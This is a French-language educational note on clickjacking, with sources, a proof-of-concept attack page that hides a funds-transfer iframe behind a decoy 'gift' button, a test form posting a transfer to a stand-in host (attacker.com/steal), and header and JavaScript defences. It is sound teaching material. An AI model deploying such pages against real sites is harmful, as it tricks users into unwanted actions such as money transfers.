# Clickjacking
## COUCHE 7

### Usurpation
### Contournement
### Observation

#### ATTAQUE = CLICKJACKING

##### CONFIDENTIALITÉ
##### INTÉGRITÉ

**Description** :
Le clickjacking consiste à tromper un utilisateur en masquant un contenu malveillant derrière un bouton ou lien légitime, souvent via une iframe invisible.

**Source** : https://owasp.org/www-community/attacks/Clickjacking1<br>
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options1<br>
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors

## Déroulé de l’attaque (PoC)

### 1.Cible visée
Imaginons que la cible soit une page sensible comme :  
`https://example.com/transfer-funds`

### 2.Création d’une page piégée

#### `malicious.html` (hébergée par l'attaquant)

```html
<!DOCTYPE html>
<html>
<head>
  <title>Concours gratuit !</title>
  <style>
    iframe {
      opacity: 0;
      position: absolute;
      top: 50px;
      left: 50px;
      width: 800px;
      height: 600px;
      z-index: 2;
    }
    #fake-button {
      position: absolute;
      top: 50px;
      left: 50px;
      z-index: 3;
    }
  </style>
</head>
<body>

<h1>Cliquez ici pour recevoir votre cadeau !</h1>
<button id="fake-button">Obtenir le cadeau</button>

<iframe src="https://example.com/transfer-funds" frameborder="0"></iframe>

</body>
</html>
```

### 3.Explication

L'utilisateur croit cliquer sur un bouton visible alors qu'il clique en réalité sur une action masquée dans une iframe transparente.

##Test local

### `victim.html`

```html
<!DOCTYPE html>
<html>
<head><title>Banque en ligne</title></head>
<body>
  <form action="https://attacker.com/steal" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker_account">
    <input type="submit" value="Transférer">
  </form>
</body>
</html>
```

##Défense

### En-têtes HTTP à ajouter sur le site cible

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
```

### Protection JavaScript

```javascript
if (top !== self) {
  top.location = self.location;
}
```
